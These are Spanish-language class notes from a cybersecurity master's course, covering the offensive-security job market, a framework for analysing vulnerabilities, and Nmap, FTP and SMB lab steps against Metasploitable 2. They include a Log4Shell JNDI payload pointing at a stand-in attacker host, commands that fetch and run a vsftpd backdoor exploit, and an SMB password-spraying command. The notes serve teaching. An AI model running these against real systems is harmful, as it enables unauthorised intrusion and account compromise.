> [!info] Ficha tÃ©cnica
> **MÃ¡ster de Ciberseguridad e Inteligencia Artificial** Â· **Clase 24**
> **MÃ³dulo:** MODULO3
> **Tema:** Clase 24
> **Fuente:** Apuntes Joselu Â· Evolve Academy

> [!tip] CÃ³mo leer estos apuntes
> Resumen estructurado de la clase 24. Contenido optimizado para estudio activo y repaso rÃ¡pido antes de exÃ¡menes.

---

---

--
MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy

## 1.

Contexto y estructura de la sesiÃ³n

Esta sesiÃ³n la imparte **Yuba GonzÃ¡lez** (uno de los profesores del mÃ¡ster que tambiÃ©n fue objeto del ejercicio HUMINT de la clase 9).

Tiene un propÃ³sito doble:

1. **Consolidar conceptualmente** todo lo visto durante la semana con Metasploitable 2, enfatizando los conceptos mÃ¡s importantes en lugar de repetir comandos. 2. **Dar un mapa claro del mercado laboral** en seguridad ofensiva para que los alumnos entiendan hacia quÃ© perfil se dirigen y quÃ© se les va a pedir al salir del mÃ¡ster.

El hilo conductor de toda la sesiÃ³n es el mismo: **antes de lanzar una herramienta, entender quÃ© estÃ¡ pasando por debajo y por quÃ©**.

## 2.

> [!important] ### Advertencia clave: Metasploit, cuanto menos mejor

Yuba abre con una advertencia que condiciona toda la metodologÃ­a:

**Metasploit es una herramienta potente que aglutina muchas capacidades, pero acostumbrarse a usarla tiene un coste real:** en las certificaciones mÃ¡s importantes del sector (OSCP, eCPPTv2) estÃ¡ prohibida o muy limitada.

Si se aprende con Metasploit como muleta, al quitarla en el examen no se sabe quÃ© estÃ¡ ocurriendo por debajo.

**ExcepciÃ³n vÃ¡lida:** el eJPT (la certificaciÃ³n incluida en el mÃ¡ster) y los escenarios de **pivoting** entre mÃ¡quinas, donde Metasploit centraliza bien la gestiÃ³n de sesiones y tiene sentido usarlo como hub de control.

**La regla prÃ¡ctica:** aprender a hacer todo a mano primero (scripts Python, herramientas especÃ­ficas, comandos directos).

Cuando ya se entiende quÃ© hace cada paso, Metasploit se convierte en una comodidad opcional, no en un requisito.

## 3.

Mapa del mercado laboral en seguridad ofensiva

### Perfil junior --- lo que el mercado pide al salir del mÃ¡ster

**1.

AuditorÃ­as web dinÃ¡micas** El gran foco de entrada al mercado.

AnÃ¡lisis de vulnerabilidades en aplicaciones web en ejecuciÃ³n: OWASP Top 10, WordPress con WPScan, APIs, formularios, autenticaciÃ³n.

Es lo que mÃ¡s se pide a perfiles juniors.

El mÃ¡ster dedica semanas enteras a esto.

**2.

AuditorÃ­as de APIs y web services** Muy similar a la web dinÃ¡mica, se trabaja con Burp Suite.

Hay que conocer la diferencia entre APIs REST y servicios mÃ¡s antiguos tipo SOAP, pero el proceso de ataque es anÃ¡logo.

**3.

AuditorÃ­as externas** Simular un atacante externo sin informaciÃ³n previa (**caja negra**).

RecopilaciÃ³n OSINT, enumeraciÃ³n de infraestructura expuesta, bÃºsqueda de servicios vulnerables en el perÃ­metro.

El objetivo es llegar al **acceso inicial** al servidor; ahÃ­ termina la auditorÃ­a externa y empezarÃ­a una interna.

**4.

Vulnerability Management** Uso de escÃ¡neres automatizados (**Nessus**, **OpenVAS**, **Qualys**), verificaciÃ³n de falsos positivos y comprobaciÃ³n manual de resultados.

Trabajo rutinario pero habitual en equipos con poco personal.

No requiere mucha experiencia tÃ©cnica ofensiva.

**5.

AuditorÃ­as Wi-Fi** Redes WPA2-PSK domÃ©sticas y redes Enterprise corporativas (802.1X, RADIUS).

SÃ­ entra en el mÃ¡ster.

### Perfil mÃ¡s avanzado --- conocimiento de base, no el primer trabajo

**6.

AuditorÃ­as internas / Directorio Activo** Comprometer infraestructura interna Windows.

Ataques Kerberos (Kerberoasting, AS-REP Roasting), Pass-the-Hash, movimiento lateral, comprometer el Domain Controller.

El mÃ¡ster lo cubre y los alumnos saldrÃ¡n sabiendo hacerlo, pero no es el primer trabajo de un junior.

**7.

Red Team** Ejercicios de 4-5 meses simulando un APT real.

Combinan acceso fÃ­sico (badging), ingenierÃ­a social, auditorÃ­a externa, interna y pivoting en una cadena continua.

Requieren perfiles senior consolidados.

**8.

AuditorÃ­as cloud (AWS, Azure, GCP)** Mundo propio, hiper especializado, con metodologÃ­as propias.

Queda fuera del alcance del mÃ¡ster.

**9.

IngenierÃ­a social** Phishing con **GoPhish**, vishing (llamadas suplantando identidad), baiting con USBs infectados.

El phishing sÃ­ entra en el mÃ¡ster.

**10.

IoT y OT/ICS** AuditorÃ­as de dispositivos embebidos, PLCs, infraestructuras industriales (SCADA, Modbus).

Especializaciones independientes.

### Especializaciones de referencia cultural (no objetivo del mÃ¡ster)

Car hacking, 5G y guerra electrÃ³nica, ATMs, auditorÃ­as de LLMs e IAs generativas, pipelines CI/CD, contenedores Docker/Kubernetes.

### Tipos de caja y su aplicaciÃ³n prÃ¡ctica

Modalidad InformaciÃ³n inicial Uso habitual
 ------------- ---------------------------------------- --------------------------------
Caja negra Ninguna AuditorÃ­as externas, Red Team Caja gris Parcial (ej. credenciales de usuario) Lo mÃ¡s habitual en la prÃ¡ctica Caja blanca CÃ³digo fuente, diagramas, acceso total AuditorÃ­as de cÃ³digo, DevSecOps

La distinciÃ³n no siempre implica dificultad o precio diferente; depende de cuÃ¡nta informaciÃ³n facilita el cliente.

En la prÃ¡ctica real, casi todo se mueve entre caja negra y caja gris.

## 4.

Marco mental de cuatro elementos para analizar vulnerabilidades

El nÃºcleo tÃ©cnico de la sesiÃ³n es un **framework conceptual universal** que aplica a cualquier vulnerabilidad de servicio, independientemente del protocolo:

Elemento DescripciÃ³n
------------- -------------------------------------------------------------------------------------------------------------------------------------------
Fuente De dÃ³nde llega la informaciÃ³n que dispara la vulnerabilidad: entrada de usuario, cabecera HTTP, fichero de configuraciÃ³n, librerÃ­a externa Proceso QuÃ© hace el servicio con esa informaciÃ³n.

AquÃ­ ocurre la mayor parte de las vulnerabilidades Privilegios Con quÃ© permisos se ejecuta el proceso.

Un mismo fallo es trivial o catastrÃ³fico segÃºn sea usuario normal o root/SYSTEM Destino A dÃ³nde llega el resultado del procesamiento; quÃ© impacto tiene

### Ejemplo aplicado: Log4Shell (CVE-2021-44228)

Una de las vulnerabilidades mÃ¡s crÃ­ticas de los Ãºltimos aÃ±os, analizada con el marco:

- **Fuente:** la cabecera User-Agent de una peticiÃ³n HTTP, manipulada por el atacante con un payload malicioso (\${jndi:ldap://atacante.com/exploit}).
- **Proceso:** la librerÃ­a **Log4j**, en lugar de registrar la cadena como texto plano, la **interpreta y la ejecuta** (evaluaciÃ³n de expresiones JNDI/LDAP).
- **Privilegios:** si el proceso Java que usa Log4j corre con permisos elevados, el cÃ³digo ejecutado tiene esos mismos permisos.
- **Destino:** **RCE** (*Remote Code Execution*) en la mÃ¡quina vÃ­ctima.

**Por quÃ© este marco es poderoso:** no cambia entre protocolos.

FTP, SMB, SSH, HTTP, todos se analizan con fuente â†’ proceso â†’ privilegios â†’ destino.

Lo que cambia es la implementaciÃ³n concreta, no el esquema mental.

**Origen de la mayorÃ­a de vulnerabilidades:** malas configuraciones, no zero-days.

Credenciales por defecto, autenticaciÃ³n anÃ³nima habilitada, permisos excesivos.

## 5.

MetodologÃ­a de trabajo: orden antes que velocidad

### Estructura de carpetas del proyecto

Antes de lanzar cualquier herramienta, crear la estructura de trabajo:

```bash
mkdir metasploitable2 cd metasploitable2 mkdir recon mkdir exploits
```

Los resultados de Nmap se guardan desde el principio para no tener que relanzar escaneos:

```bash
nmap -p- IP -oA recon/nmap_full # Guarda en los tres formatos: .nmap, .gnmap y .xml
```

### Tmux: dividir la terminal para trabajar en paralelo

**Tmux** permite dividir la terminal en mÃºltiples paneles y lanzar escaneos simultÃ¡neos sin bloquear la pantalla:

tmux # Iniciar sesiÃ³n de tmux Ctrl+B â†’ " # Dividir horizontalmente Ctrl+B â†’ % # Dividir verticalmente Ctrl+B â†’ flechas # Moverse entre paneles

Activar el ratÃ³n en Tmux:

```bash
echo "set -g mouse on" >> ~/.tmux.conf
```

# Dentro de tmux: Ctrl+B â†’ :source-file ~/.tmux.conf

### MetodologÃ­a Nmap en tres fases

Fase Comando PropÃ³sito
 ----------------- ------------------------------------------- ----------------------------------------------------
Fase 0 (rÃ¡pida) nmap -p 1-1000 IP Resultado inmediato de los 1000 puertos mÃ¡s comunes Fase 1 nmap -p- \--min-rate 5000 IP Todos los puertos (1-65535) Fase 2 nmap -p PUERTOS -sV -sC \--script vuln IP Versiones + scripts default + scripts de CVEs

**Flags importantes:** - -Pn â†’ omite el ping/host discovery (imprescindible si ICMP estÃ¡ bloqueado) - -sC = \--script=default â†’ lanza los scripts de la categorÃ­a *default* de Nmap - \--script vuln â†’ lanza scripts especÃ­ficos de CVEs (mÃ¡s intrusivo, mÃ¡s lento, vÃ¡lido en laboratorio y vulnerability management) - -oA prefijo â†’ guarda los tres formatos a la vez (.nmap, .gnmap, .xml)

### HackTricks como referencia metodolÃ³gica

**HackTricks** (book.hacktricks.xyz) es la referencia estÃ¡ndar por protocolo en el sector: cada servicio tiene su propia pÃ¡gina con comandos de enumeraciÃ³n, ataques tÃ­picos y recursos adicionales.

Debe consultarse siempre al encontrar un servicio desconocido.

## 6.

FTP --- Flujo consolidado sin Metasploit

El flujo correcto, haciendo todo a mano:

# 1.

Identificar la versiÃ³n en el output de Nmap -sV

# vsftpd 2.3.4

# 2.

Buscar exploits para esa versiÃ³n

searchsploit vsftpd 2.3.4

# 3.

Descargar el script Python con el flag -m (mirror)

searchsploit -m unix/remote/49757.py

# 4.

Ejecutar

python3 49757.py -h IP_OBJETIVO

# Si el primer intento falla: relanzar (estados intermedios en laboratorio)

# 5.

Verificar acceso anÃ³nimo

ftp IP_OBJETIVO

# usuario: anonymous

# contraseÃ±a: cualquier texto o vacÃ­a

## 7.

SMB --- EnumeraciÃ³n completa con NetExec y enum4linux

### Herramientas complementarias para SMB

**smbclient** --- listar recursos compartidos con sesiÃ³n nula:

smbclient -N -L //IP_OBJETIVO

**NetExec** --- ver permisos exactos de lectura/escritura por carpeta:

netexec smb IP_OBJETIVO -u '' -p '' --shares

Resultado: tabla con carpetas y si permiten READ, WRITE o ninguno. **Las carpetas con WRITE son especialmente interesantes** porque permiten subir ficheros.

Acceder a una carpeta especÃ­fica:

smbclient //IP_OBJETIVO/tmp -N

# Dentro: ls, get fichero, put fichero

**enum4linux** --- enumeraciÃ³n completa:

enum4linux -a IP_OBJETIVO

Devuelve: nombre de dominio, versiÃ³n Samba, usuarios del sistema, recursos compartidos, polÃ­ticas de contraseÃ±as.

La lista de usuarios obtenida sirve como diccionario para ataques posteriores.

### Password spraying contra SMB

Probar una contraseÃ±a concreta contra todos los usuarios (en lugar de fuerza bruta clÃ¡sica que podrÃ­a bloquear cuentas):

netexec smb IP_OBJETIVO -u usuarios.txt -p 'admin' --continue-on-success

Especialmente Ãºtil en Directorio Activo, donde el bloqueo de cuentas puede estar configurado.

## 8.

PrÃ³xima fase del mÃ¡ster: hacking web

A partir de las siguientes sesiones el mÃ¡ster entra de lleno en **hacking web**, donde todo lo visto hasta aquÃ­ (metodologÃ­a, enumeraciÃ³n, fuzzing, Burp Suite) se aplica a un contexto mucho mÃ¡s amplio y con mucha mÃ¡s superficie de ataque.

## 9.

Conceptos y tÃ©rminos clave corregidos

TÃ©rmino en la transcripciÃ³n CorrecciÃ³n / AclaraciÃ³n
------------------------------------ ------------------------------------------------------------------------------------------------------------------------------------
Metapload / Metaploid / MetaSprout **Metasploit Framework** -- framework de explotaciÃ³n Sprout Solar / SearchSploit **searchsploit** -- buscador local de exploits de Exploit-DB OSCP / eCPPT **OSCP** y **eCPPTv2** -- certificaciones de pentesting donde Metasploit estÃ¡ limitado o prohibido EJPT **eJPT v2** (*eLearnSecurity Junior Penetration Tester*) -- certificaciÃ³n incluida en el mÃ¡ster, donde Metasploit sÃ­ estÃ¡ permitido log 4g / log 4j / Log4Shell **Log4Shell** (CVE-2021-44228) -- vulnerabilidad crÃ­tica en la librerÃ­a Java Log4j, RCE mediante JNDI JNDI / jnda **JNDI** (*Java Naming and Directory Interface*) -- mecanismo de Java explotado en Log4Shell Tmux / Timex **Tmux** (*Terminal Multiplexer*) -- herramienta para dividir la terminal en mÃºltiples paneles HackTricks / Hack Tricks **HackTricks** (book.hacktricks.xyz) -- referencia metodolÃ³gica por protocolo para pentesting NetExec / NextExec **NetExec** -- herramienta de enumeraciÃ³n y explotaciÃ³n de protocolos de red corporativos (evoluciÃ³n de CrackMapExec) enum 4 linux / enum4 **enum4linux** -- herramienta de enumeraciÃ³n completa SMB/Samba/NetBIOS password spraying / spray **Password Spraying** -- probar una contraseÃ±a concreta contra muchos usuarios (evita bloqueos) Nessus / Open Fast / Qualys **Nessus / OpenVAS / Qualys** -- escÃ¡neres de vulnerabilidades para Vulnerability Management GoFish **GoPhish** -- framework para campaÃ±as de phishing controlado WPA2 Enterprise / WPA2 PSK **WPA2-PSK** (personal, clave compartida) y **WPA2-Enterprise** (802.1X con RADIUS) caja negra / gris / blanca **Black box / Grey box / White box** -- modalidades de auditorÃ­a segÃºn nivel de informaciÃ³n inicial APT / grupo APT **APT** (*Advanced Persistent Threat*) -- actor de amenaza sofisticado y persistente, simulado en ejercicios de Red Team ICS / SCADA / PLC **ICS** (*Industrial Control System*) / **SCADA** / **PLC** -- tecnologÃ­a operacional industrial vuln / guiÃ³n script vuln \--script vuln -- categorÃ­a de scripts NSE de Nmap que busca CVEs conocidos en los servicios detectados

Resumen elaborado para uso acadÃ©mico en el MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.

â†’

â†’

â†’

â†’
â†’
â†’
